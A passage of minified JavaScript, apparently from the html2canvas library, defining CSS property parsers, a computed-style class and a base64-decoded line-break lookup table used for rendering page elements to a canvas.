20===t.type&&"normal"===t.value?0:17===t.type||15===t.type?t.number:0}},Bn={name:"line-break",initialValue:(Cn=wn||(wn={})).NORMAL="normal",prefix:!(Cn.STRICT="strict"),type:2,parse:function(e,t){switch(t){case"strict":return wn.STRICT;case"normal":default:return wn.NORMAL}}},En={name:"line-height",initialValue:"normal",prefix:!1,type:4},Tn=function(e,t){return Re(e)&&"normal"===e.value?1.2*t:17===e.type?t*e.number:Ge(e)?Je(e,t):t},Pn={name:"list-style-image",initialValue:"none",type:0,prefix:!1,parse:function(e,t){return 20===t.type&&"none"===t.value?null:Nt(e,t)}};(Sn=xn||(xn={}))[Sn.INSIDE=0]="INSIDE";var In,Fn,Ln={name:"list-style-position",initialValue:"outside",prefix:!(Sn[Sn.OUTSIDE=1]="OUTSIDE"),type:2,parse:function(e,t){switch(t){case"inside":return xn.INSIDE;case"outside":default:return xn.OUTSIDE}}};(Fn=In||(In={}))[Fn.NONE=-1]="NONE",Fn[Fn.DISC=0]="DISC",Fn[Fn.CIRCLE=1]="CIRCLE",Fn[Fn.SQUARE=2]="SQUARE",Fn[Fn.DECIMAL=3]="DECIMAL",Fn[Fn.CJK_DECIMAL=4]="CJK_DECIMAL",Fn[Fn.DECIMAL_LEADING_ZERO=5]="DECIMAL_LEADING_ZERO",Fn[Fn.LOWER_ROMAN=6]="LOWER_ROMAN",Fn[Fn.UPPER_ROMAN=7]="UPPER_ROMAN",Fn[Fn.LOWER_GREEK=8]="LOWER_GREEK",Fn[Fn.LOWER_ALPHA=9]="LOWER_ALPHA",Fn[Fn.UPPER_ALPHA=10]="UPPER_ALPHA",Fn[Fn.ARABIC_INDIC=11]="ARABIC_INDIC",Fn[Fn.ARMENIAN=12]="ARMENIAN",Fn[Fn.BENGALI=13]="BENGALI",Fn[Fn.CAMBODIAN=14]="CAMBODIAN",Fn[Fn.CJK_EARTHLY_BRANCH=15]="CJK_EARTHLY_BRANCH",Fn[Fn.CJK_HEAVENLY_STEM=16]="CJK_HEAVENLY_STEM",Fn[Fn.CJK_IDEOGRAPHIC=17]="CJK_IDEOGRAPHIC",Fn[Fn.DEVANAGARI=18]="DEVANAGARI",Fn[Fn.ETHIOPIC_NUMERIC=19]="ETHIOPIC_NUMERIC",Fn[Fn.GEORGIAN=20]="GEORGIAN",Fn[Fn.GUJARATI=21]="GUJARATI",Fn[Fn.GURMUKHI=22]="GURMUKHI",Fn[Fn.HEBREW=22]="HEBREW",Fn[Fn.HIRAGANA=23]="HIRAGANA",Fn[Fn.HIRAGANA_IROHA=24]="HIRAGANA_IROHA",Fn[Fn.JAPANESE_FORMAL=25]="JAPANESE_FORMAL",Fn[Fn.JAPANESE_INFORMAL=26]="JAPANESE_INFORMAL",Fn[Fn.KANNADA=27]="KANNADA",Fn[Fn.KATAKANA=28]="KATAKANA",Fn[Fn.KATAKANA_IROHA=29]="KATAKANA_IROHA",Fn[Fn.KHMER=30]="KHMER",Fn[Fn.KOREAN_HANGUL_FORMAL=31]="KOREAN_HANGUL_FORMAL",Fn[Fn.KOREAN_HANJA_FORMAL=32]="KOREAN_HANJA_FORMAL",Fn[Fn.KOREAN_HANJA_INFORMAL=33]="KOREAN_HANJA_INFORMAL",Fn[Fn.LAO=34]="LAO",Fn[Fn.LOWER_ARMENIAN=35]="LOWER_ARMENIAN",Fn[Fn.MALAYALAM=36]="MALAYALAM",Fn[Fn.MONGOLIAN=37]="MONGOLIAN",Fn[Fn.MYANMAR=38]="MYANMAR",Fn[Fn.ORIYA=39]="ORIYA",Fn[Fn.PERSIAN=40]="PERSIAN",Fn[Fn.SIMP_CHINESE_FORMAL=41]="SIMP_CHINESE_FORMAL",Fn[Fn.SIMP_CHINESE_INFORMAL=42]="SIMP_CHINESE_INFORMAL",Fn[Fn.TAMIL=43]="TAMIL",Fn[Fn.TELUGU=44]="TELUGU",Fn[Fn.THAI=45]="THAI",Fn[Fn.TIBETAN=46]="TIBETAN",Fn[Fn.TRAD_CHINESE_FORMAL=47]="TRAD_CHINESE_FORMAL",Fn[Fn.TRAD_CHINESE_INFORMAL=48]="TRAD_CHINESE_INFORMAL",Fn[Fn.UPPER_ARMENIAN=49]="UPPER_ARMENIAN",Fn[Fn.DISCLOSURE_OPEN=50]="DISCLOSURE_OPEN";var On,Nn,Dn={name:"list-style-type",initialValue:"none",prefix:!(Fn[Fn.DISCLOSURE_CLOSED=51]="DISCLOSURE_CLOSED"),type:2,parse:function(e,t){switch(t){case"disc":return In.DISC;case"circle":return In.CIRCLE;case"square":return In.SQUARE;case"decimal":return In.DECIMAL;case"cjk-decimal":return In.CJK_DECIMAL;case"decimal-leading-zero":return In.DECIMAL_LEADING_ZERO;case"lower-roman":return In.LOWER_ROMAN;case"upper-roman":return In.UPPER_ROMAN;case"lower-greek":return In.LOWER_GREEK;case"lower-alpha":return In.LOWER_ALPHA;case"upper-alpha":return In.UPPER_ALPHA;case"arabic-indic":return In.ARABIC_INDIC;case"armenian":return In.ARMENIAN;case"bengali":return In.BENGALI;case"cambodian":return In.CAMBODIAN;case"cjk-earthly-branch":return In.CJK_EARTHLY_BRANCH;case"cjk-heavenly-stem":return In.CJK_HEAVENLY_STEM;case"cjk-ideographic":return In.CJK_IDEOGRAPHIC;case"devanagari":return In.DEVANAGARI;case"ethiopic-numeric":return In.ETHIOPIC_NUMERIC;case"georgian":return In.GEORGIAN;case"gujarati":return In.GUJARATI;case"gurmukhi":return In.GURMUKHI;case"hebrew":return In.HEBREW;case"hiragana":return In.HIRAGANA;case"hiragana-iroha":return In.HIRAGANA_IROHA;case"japanese-formal":return In.JAPANESE_FORMAL;case"japanese-informal":return In.JAPANESE_INFORMAL;case"kannada":return In.KANNADA;case"katakana":return In.KATAKANA;case"katakana-iroha":return In.KATAKANA_IROHA;case"khmer":return In.KHMER;case"korean-hangul-formal":return In.KOREAN_HANGUL_FORMAL;case"korean-hanja-formal":return In.KOREAN_HANJA_FORMAL;case"korean-hanja-informal":return In.KOREAN_HANJA_INFORMAL;case"lao":return In.LAO;case"lower-armenian":return In.LOWER_ARMENIAN;case"malayalam":return In.MALAYALAM;case"mongolian":return In.MONGOLIAN;case"myanmar":return In.MYANMAR;case"oriya":return In.ORIYA;case"persian":return In.PERSIAN;case"simp-chinese-formal":return In.SIMP_CHINESE_FORMAL;case"simp-chinese-informal":return In.SIMP_CHINESE_INFORMAL;case"tamil":return In.TAMIL;case"telugu":return In.TELUGU;case"thai":return In.THAI;case"tibetan":return In.TIBETAN;case"trad-chinese-formal":return In.TRAD_CHINESE_FORMAL;case"trad-chinese-informal":return In.TRAD_CHINESE_INFORMAL;case"upper-armenian":return In.UPPER_ARMENIAN;case"disclosure-open":return In.DISCLOSURE_OPEN;case"disclosure-closed":return In.DISCLOSURE_CLOSED;case"none":default:return In.NONE}}},Rn=function(e){return{name:"margin-"+e,initialValue:"0",prefix:!1,type:4}},jn=Rn("top"),Un=Rn("right"),$n=Rn("bottom"),zn=Rn("left");(Nn=On||(On={}))[Nn.VISIBLE=0]="VISIBLE",Nn[Nn.HIDDEN=1]="HIDDEN",Nn[Nn.SCROLL=2]="SCROLL",Nn[Nn.CLIP=3]="CLIP";var Hn,Vn,Qn={name:"overflow",initialValue:"visible",prefix:!(Nn[Nn.AUTO=4]="AUTO"),type:1,parse:function(e,t){return t.filter(Re).map((function(e){switch(e.value){case"hidden":return On.HIDDEN;case"scroll":return On.SCROLL;case"clip":return On.CLIP;case"auto":return On.AUTO;case"visible":default:return On.VISIBLE}}))}},Gn={name:"overflow-wrap",initialValue:"normal",prefix:!1,type:2,parse:function(e,t){switch(t){case"break-word":return"break-word";case"normal":default:return"normal"}}},Wn=function(e){return{name:"padding-"+e,initialValue:"0",prefix:!1,type:3,format:"length-percentage"}},Kn=Wn("top"),qn=Wn("right"),Xn=Wn("bottom"),Yn=Wn("left");(Vn=Hn||(Hn={}))[Vn.LEFT=0]="LEFT",Vn[Vn.CENTER=1]="CENTER";var Jn,Zn,er={name:"text-align",initialValue:"left",prefix:!(Vn[Vn.RIGHT=2]="RIGHT"),type:2,parse:function(e,t){switch(t){case"right":return Hn.RIGHT;case"center":case"justify":return Hn.CENTER;case"left":default:return Hn.LEFT}}};(Zn=Jn||(Jn={}))[Zn.STATIC=0]="STATIC",Zn[Zn.RELATIVE=1]="RELATIVE",Zn[Zn.ABSOLUTE=2]="ABSOLUTE",Zn[Zn.FIXED=3]="FIXED";var tr,nr,rr={name:"position",initialValue:"static",prefix:!(Zn[Zn.STICKY=4]="STICKY"),type:2,parse:function(e,t){switch(t){case"relative":return Jn.RELATIVE;case"absolute":return Jn.ABSOLUTE;case"fixed":return Jn.FIXED;case"sticky":return Jn.STICKY}return Jn.STATIC}},ir={name:"text-shadow",initialValue:"none",type:1,prefix:!1,parse:function(e,t){return 1===t.length&&Ue(t[0],"none")?[]:He(t).map((function(t){for(var n={color:At.TRANSPARENT,offsetX:Ke,offsetY:Ke,blur:Ke},r=0,i=0;i<t.length;i++){var a=t[i];Qe(a)?(0===r?n.offsetX=a:1===r?n.offsetY=a:n.blur=a,r++):n.color=rt(e,a)}return n}))}};(nr=tr||(tr={}))[nr.NONE=0]="NONE",nr[nr.LOWERCASE=1]="LOWERCASE",nr[nr.UPPERCASE=2]="UPPERCASE";var ar,or,sr={name:"text-transform",initialValue:"none",prefix:!(nr[nr.CAPITALIZE=3]="CAPITALIZE"),type:2,parse:function(e,t){switch(t){case"uppercase":return tr.UPPERCASE;case"lowercase":return tr.LOWERCASE;case"capitalize":return tr.CAPITALIZE}return tr.NONE}},lr={name:"transform",initialValue:"none",prefix:!0,type:0,parse:function(e,t){if(20===t.type&&"none"===t.value)return null;if(18!==t.type)return null;var n=cr[t.name];if(void 0===n)throw new Error('Attempting to parse an unsupported transform function "'+t.name+'"');return n(t.values)}},cr={matrix:function(e){var t=e.filter((function(e){return 17===e.type})).map((function(e){return e.number}));return 6===t.length?t:null},matrix3d:function(e){var t=e.filter((function(e){return 17===e.type})).map((function(e){return e.number})),n=t[0],r=t[1];t[2],t[3];var i=t[4],a=t[5];t[6],t[7],t[8],t[9],t[10],t[11];var o=t[12],s=t[13];return t[14],t[15],16===t.length?[n,r,i,a,o,s]:null}},ur={type:16,number:50,flags:4},dr=[ur,ur],pr={name:"transform-origin",initialValue:"50% 50%",prefix:!0,type:1,parse:function(e,t){var n=t.filter(Ge);return 2!==n.length?dr:[n[0],n[1]]}};(or=ar||(ar={}))[or.VISIBLE=0]="VISIBLE",or[or.HIDDEN=1]="HIDDEN";var hr,fr,Ar={name:"visible",initialValue:"none",prefix:!(or[or.COLLAPSE=2]="COLLAPSE"),type:2,parse:function(e,t){switch(t){case"hidden":return ar.HIDDEN;case"collapse":return ar.COLLAPSE;case"visible":default:return ar.VISIBLE}}};(fr=hr||(hr={})).NORMAL="normal",fr.BREAK_ALL="break-all";var mr,vr,gr={name:"word-break",initialValue:"normal",prefix:!(fr.KEEP_ALL="keep-all"),type:2,parse:function(e,t){switch(t){case"break-all":return hr.BREAK_ALL;case"keep-all":return hr.KEEP_ALL;case"normal":default:return hr.NORMAL}}},yr={name:"z-index",initialValue:"auto",prefix:!1,type:0,parse:function(e,t){if(20===t.type)return{auto:!0,order:0};if(De(t))return{auto:!1,order:t.number};throw new Error("Invalid z-index number parsed")}},br=function(e,t){if(15===t.type)switch(t.unit.toLowerCase()){case"s":return 1e3*t.number;case"ms":return t.number}throw new Error("Unsupported time type")},_r={name:"opacity",initialValue:"1",type:0,prefix:!1,parse:function(e,t){return De(t)?t.number:1}},wr={name:"text-decoration-color",initialValue:"transparent",prefix:!1,type:3,format:"color"},Cr={name:"text-decoration-line",initialValue:"none",prefix:!1,type:1,parse:function(e,t){return t.filter(Re).map((function(e){switch(e.value){case"underline":return 1;case"overline":return 2;case"line-through":return 3;case"none":return 4}return 0})).filter((function(e){return 0!==e}))}},xr={name:"font-family",initialValue:"",prefix:!1,type:1,parse:function(e,t){var n=[],r=[];return t.forEach((function(e){switch(e.type){case 20:case 0:n.push(e.value);break;case 17:n.push(e.number.toString());break;case 4:r.push(n.join(" ")),n.length=0}})),n.length&&r.push(n.join(" ")),r.map((function(e){return-1===e.indexOf(" ")?e:"'"+e+"'"}))}},Sr={name:"font-size",initialValue:"0",prefix:!1,type:3,format:"length"},kr={name:"font-weight",initialValue:"normal",type:0,prefix:!1,parse:function(e,t){if(De(t))return t.number;if(Re(t))switch(t.value){case"bold":return 700;case"normal":default:return 400}return 400}},Mr={name:"font-variant",initialValue:"none",type:1,prefix:!1,parse:function(e,t){return t.filter(Re).map((function(e){return e.value}))}};(vr=mr||(mr={})).NORMAL="normal",vr.ITALIC="italic";var Br,Er,Tr={name:"font-style",initialValue:"normal",prefix:!(vr.OBLIQUE="oblique"),type:2,parse:function(e,t){switch(t){case"oblique":return mr.OBLIQUE;case"italic":return mr.ITALIC;case"normal":default:return mr.NORMAL}}},Pr=function(e,t){return 0!=(e&t)},Ir={name:"content",initialValue:"none",type:1,prefix:!1,parse:function(e,t){if(0===t.length)return[];var n=t[0];return 20===n.type&&"none"===n.value?[]:t}},Fr={name:"counter-increment",initialValue:"none",prefix:!0,type:1,parse:function(e,t){if(0===t.length)return null;var n=t[0];if(20===n.type&&"none"===n.value)return null;for(var r=[],i=t.filter($e),a=0;a<i.length;a++){var o=i[a],s=i[a+1];if(20===o.type){var l=s&&De(s)?s.number:1;r.push({counter:o.value,increment:l})}}return r}},Lr={name:"counter-reset",initialValue:"none",prefix:!0,type:1,parse:function(e,t){if(0===t.length)return[];for(var n=[],r=t.filter($e),i=0;i<r.length;i++){var a=r[i],o=r[i+1];if(Re(a)&&"none"!==a.value){var s=o&&De(o)?o.number:0;n.push({counter:a.value,reset:s})}}return n}},Or={name:"duration",initialValue:"0s",prefix:!1,type:1,parse:function(e,t){return t.filter(Ne).map((function(e){return br(0,e)}))}},Nr={name:"quotes",initialValue:"none",prefix:!0,type:1,parse:function(e,t){if(0===t.length)return null;var n=t[0];if(20===n.type&&"none"===n.value)return null;var r=[],i=t.filter(je);if(i.length%2!=0)return null;for(var a=0;a<i.length;a+=2){var o=i[a].value,s=i[a+1].value;r.push({open:o,close:s})}return r}},Dr=function(e,t,n){if(!e)return"";var r=e[Math.min(t,e.length-1)];return r?n?r.open:r.close:""},Rr={name:"box-shadow",initialValue:"none",type:1,prefix:!1,parse:function(e,t){return 1===t.length&&Ue(t[0],"none")?[]:He(t).map((function(t){for(var n={color:255,offsetX:Ke,offsetY:Ke,blur:Ke,spread:Ke,inset:!1},r=0,i=0;i<t.length;i++){var a=t[i];Ue(a,"inset")?n.inset=!0:Qe(a)?(0===r?n.offsetX=a:1===r?n.offsetY=a:2===r?n.blur=a:n.spread=a,r++):n.color=rt(e,a)}return n}))}};(Er=Br||(Br={}))[Er.FILL=0]="FILL",Er[Er.STROKE=1]="STROKE";for(var jr={name:"paint-order",initialValue:"normal",prefix:!(Er[Er.MARKERS=2]="MARKERS"),type:1,parse:function(e,t){var n=[Br.FILL,Br.STROKE,Br.MARKERS],r=[];return t.filter(Re).forEach((function(e){switch(e.value){case"stroke":r.push(Br.STROKE);break;case"fill":r.push(Br.FILL);break;case"markers":r.push(Br.MARKERS)}})),n.forEach((function(e){-1===r.indexOf(e)&&r.push(e)})),r}},Ur={name:"-webkit-text-stroke-color",initialValue:"currentcolor",prefix:!1,type:3,format:"color"},$r={name:"-webkit-text-stroke-width",initialValue:"0",type:0,prefix:!1,parse:function(e,t){return Ne(t)?t.number:0}},zr=function(){function e(e,t){var n,r;this.animationDuration=Qr(e,Or,t.animationDuration),this.backgroundClip=Qr(e,wt,t.backgroundClip),this.backgroundColor=Qr(e,Ct,t.backgroundColor),this.backgroundImage=Qr(e,Rt,t.backgroundImage),this.backgroundOrigin=Qr(e,jt,t.backgroundOrigin),this.backgroundPosition=Qr(e,Ut,t.backgroundPosition),this.backgroundRepeat=Qr(e,Ht,t.backgroundRepeat),this.backgroundSize=Qr(e,Wt,t.backgroundSize),this.borderTopColor=Qr(e,Xt,t.borderTopColor),this.borderRightColor=Qr(e,Yt,t.borderRightColor),this.borderBottomColor=Qr(e,Jt,t.borderBottomColor),this.borderLeftColor=Qr(e,Zt,t.borderLeftColor),this.borderTopLeftRadius=Qr(e,tn,t.borderTopLeftRadius),this.borderTopRightRadius=Qr(e,nn,t.borderTopRightRadius),this.borderBottomRightRadius=Qr(e,rn,t.borderBottomRightRadius),this.borderBottomLeftRadius=Qr(e,an,t.borderBottomLeftRadius),this.borderTopStyle=Qr(e,cn,t.borderTopStyle),this.borderRightStyle=Qr(e,un,t.borderRightStyle),this.borderBottomStyle=Qr(e,dn,t.borderBottomStyle),this.borderLeftStyle=Qr(e,pn,t.borderLeftStyle),this.borderTopWidth=Qr(e,fn,t.borderTopWidth),this.borderRightWidth=Qr(e,An,t.borderRightWidth),this.borderBottomWidth=Qr(e,mn,t.borderBottomWidth),this.borderLeftWidth=Qr(e,vn,t.borderLeftWidth),this.boxShadow=Qr(e,Rr,t.boxShadow),this.color=Qr(e,gn,t.color),this.direction=Qr(e,yn,t.direction),this.display=Qr(e,bn,t.display),this.float=Qr(e,kn,t.cssFloat),this.fontFamily=Qr(e,xr,t.fontFamily),this.fontSize=Qr(e,Sr,t.fontSize),this.fontStyle=Qr(e,Tr,t.fontStyle),this.fontVariant=Qr(e,Mr,t.fontVariant),this.fontWeight=Qr(e,kr,t.fontWeight),this.letterSpacing=Qr(e,Mn,t.letterSpacing),this.lineBreak=Qr(e,Bn,t.lineBreak),this.lineHeight=Qr(e,En,t.lineHeight),this.listStyleImage=Qr(e,Pn,t.listStyleImage),this.listStylePosition=Qr(e,Ln,t.listStylePosition),this.listStyleType=Qr(e,Dn,t.listStyleType),this.marginTop=Qr(e,jn,t.marginTop),this.marginRight=Qr(e,Un,t.marginRight),this.marginBottom=Qr(e,$n,t.marginBottom),this.marginLeft=Qr(e,zn,t.marginLeft),this.opacity=Qr(e,_r,t.opacity);var i=Qr(e,Qn,t.overflow);this.overflowX=i[0],this.overflowY=i[1<i.length?1:0],this.overflowWrap=Qr(e,Gn,t.overflowWrap),this.paddingTop=Qr(e,Kn,t.paddingTop),this.paddingRight=Qr(e,qn,t.paddingRight),this.paddingBottom=Qr(e,Xn,t.paddingBottom),this.paddingLeft=Qr(e,Yn,t.paddingLeft),this.paintOrder=Qr(e,jr,t.paintOrder),this.position=Qr(e,rr,t.position),this.textAlign=Qr(e,er,t.textAlign),this.textDecorationColor=Qr(e,wr,null!==(n=t.textDecorationColor)&&void 0!==n?n:t.color),this.textDecorationLine=Qr(e,Cr,null!==(r=t.textDecorationLine)&&void 0!==r?r:t.textDecoration),this.textShadow=Qr(e,ir,t.textShadow),this.textTransform=Qr(e,sr,t.textTransform),this.transform=Qr(e,lr,t.transform),this.transformOrigin=Qr(e,pr,t.transformOrigin),this.visibility=Qr(e,Ar,t.visibility),this.webkitTextStrokeColor=Qr(e,Ur,t.webkitTextStrokeColor),this.webkitTextStrokeWidth=Qr(e,$r,t.webkitTextStrokeWidth),this.wordBreak=Qr(e,gr,t.wordBreak),this.zIndex=Qr(e,yr,t.zIndex)}return e.prototype.isVisible=function(){return 0<this.display&&0<this.opacity&&this.visibility===ar.VISIBLE},e.prototype.isTransparent=function(){return it(this.backgroundColor)},e.prototype.isTransformed=function(){return null!==this.transform},e.prototype.isPositioned=function(){return this.position!==Jn.STATIC},e.prototype.isPositionedWithZIndex=function(){return this.isPositioned()&&!this.zIndex.auto},e.prototype.isFloating=function(){return this.float!==on.NONE},e.prototype.isInlineLevel=function(){return Pr(this.display,4)||Pr(this.display,33554432)||Pr(this.display,268435456)||Pr(this.display,536870912)||Pr(this.display,67108864)||Pr(this.display,134217728)},e}(),Hr=function(e,t){this.content=Qr(e,Ir,t.content),this.quotes=Qr(e,Nr,t.quotes)},Vr=function(e,t){this.counterIncrement=Qr(e,Fr,t.counterIncrement),this.counterReset=Qr(e,Lr,t.counterReset)},Qr=function(e,t,n){var r=new Le,i=null!=n?n.toString():t.initialValue;r.write(i);var a=new Oe(r.read());switch(t.type){case 2:var o=a.parseComponentValue();return t.parse(e,Re(o)?o.value:t.initialValue);case 0:return t.parse(e,a.parseComponentValue());case 1:return t.parse(e,a.parseComponentValues());case 4:return a.parseComponentValue();case 3:switch(t.format){case"angle":return Ze(0,a.parseComponentValue());case"color":return rt(e,a.parseComponentValue());case"image":return Nt(e,a.parseComponentValue());case"length":var s=a.parseComponentValue();return Qe(s)?s:Ke;case"length-percentage":var l=a.parseComponentValue();return Ge(l)?l:Ke;case"time":return br(0,a.parseComponentValue())}}},Gr=function(e,t){var n=function(e){switch(e.getAttribute("data-html2canvas-debug")){case"all":return 1;case"clone":return 2;case"parse":return 3;case"render":return 4;default:return 0}}(e);return 1===n||t===n},Wr=function(e,t){this.context=e,this.textNodes=[],this.elements=[],this.flags=0,Gr(t,3),this.styles=new zr(e,window.getComputedStyle(t,null)),Ji(t)&&(this.styles.animationDuration.some((function(e){return 0<e}))&&(t.style.animationDuration="0s"),null!==this.styles.transform&&(t.style.transform="none")),this.bounds=o(this.context,t),Gr(t,4)&&(this.flags|=16)},Kr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",qr="undefined"==typeof Uint8Array?[]:new Uint8Array(256),Xr=0;Xr<Kr.length;Xr++)qr[Kr.charCodeAt(Xr)]=Xr;for(var Yr=function(e,t,n){return e.slice?e.slice(t,n):new Uint16Array(Array.prototype.slice.call(e,t,n))},Jr=function(){function e(e,t,n,r,i,a){this.initialValue=e,this.errorValue=t,this.highStart=n,this.highValueIndex=r,this.index=i,this.data=a}return e.prototype.get=function(e){var t;if(0<=e){if(e<55296||56319<e&&e<=65535)return t=((t=this.index[e>>5])<<2)+(31&e),this.data[t];if(e<=65535)return t=((t=this.index[2048+(e-55296>>5)])<<2)+(31&e),this.data[t];if(e<this.highStart)return t=2080+(e>>11),t=this.index[t],t+=e>>5&63,t=((t=this.index[t])<<2)+(31&e),this.data[t];if(e<=1114111)return this.data[this.highValueIndex]}return this.errorValue},e}(),Zr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",ei="undefined"==typeof Uint8Array?[]:new Uint8Array(256),ti=0;ti<Zr.length;ti++)ei[Zr.charCodeAt(ti)]=ti;var ni,ri,ii,ai,oi,si,li,ci,ui,di,pi=8,hi=9,fi=11,Ai=12,mi=(ai=function(e){var t,n,r,i,a,o=.75*e.length,s=e.length,l=0;"="===e[e.length-1]&&(o--,"="===e[e.length-2]&&o--);var c="undefined"!=typeof ArrayBuffer&&"undefined"!=typeof Uint8Array&&void 0!==Uint8Array.prototype.slice?new ArrayBuffer(o):new Array(o),u=Array.isArray(c)?c:new Uint8Array(c);for(t=0;t<s;t+=4)n=qr[e.charCodeAt(t)],r=qr[e.charCodeAt(t+1)],i=qr[e.charCodeAt(t+2)],a=qr[e.charCodeAt(t+3)],u[l++]=n<<2|r>>4,u[l++]=(15&r)<<4|i>>2,u[l++]=(3&i)<<6|63&a;return c}("AAAAAAAAAAAAEA4AGBkAAFAaAAACAAAAAAAIABAAGAAwADgACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAAQABIAEQATAAIABAACAAQAAgAEAAIABAAVABcAAgAEAAIABAACAAQAGAAaABwAHgAgACIAI4AlgAIABAAmwCjAKgAsAC2AL4AvQDFAMoA0gBPAVYBWgEIAAgACACMANoAYgFkAWwBdAF8AX0BhQGNAZUBlgGeAaMBlQGWAasBswF8AbsBwwF0AcsBYwHTAQgA2wG/AOMBdAF8AekB8QF0AfkB+wHiAHQBfAEIAAMC5gQIAAsCEgIIAAgAFgIeAggAIgIpAggAMQI5AkACygEIAAgASAJQAlgCYAIIAAgACAAKBQoFCgUTBRMFGQUrBSsFCAAIAAgACAAIAAgACAAIAAgACABdAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACABoAmgCrwGvAQgAbgJ2AggAHgEIAAgACADnAXsCCAAIAAgAgwIIAAgACAAIAAgACACKAggAkQKZAggAPADJAAgAoQKkAqwCsgK6AsICCADJAggA0AIIAAgACAAIANYC3gIIAAgACAAIAAgACABAAOYCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAkASoB+QIEAAgACAA8AEMCCABCBQgACABJBVAFCAAIAAgACAAIAAgACAAIAAgACABTBVoFCAAIAFoFCABfBWUFCAAIAAgACAAIAAgAbQUIAAgACAAIAAgACABzBXsFfQWFBYoFigWKBZEFigWKBYoFmAWfBaYFrgWxBbkFCAAIAAgACAAIAAgACAAIAAgACAAIAMEFCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAMgFCADQBQgACAAIAAgACAAIAAgACAAIAAgACAAIAO4CCAAIAAgAiQAIAAgACABAAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAD0AggACAD8AggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIANYFCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAMDvwAIAAgAJAIIAAgACAAIAAgACAAIAAgACwMTAwgACAB9BOsEGwMjAwgAKwMyAwsFYgE3A/MEPwMIAEUDTQNRAwgAWQOsAGEDCAAIAAgACAAIAAgACABpAzQFNQU2BTcFOAU5BToFNAU1BTYFNwU4BTkFOgU0BTUFNgU3BTgFOQU6BTQFNQU2BTcFOAU5BToFNAU1BTYFNwU4B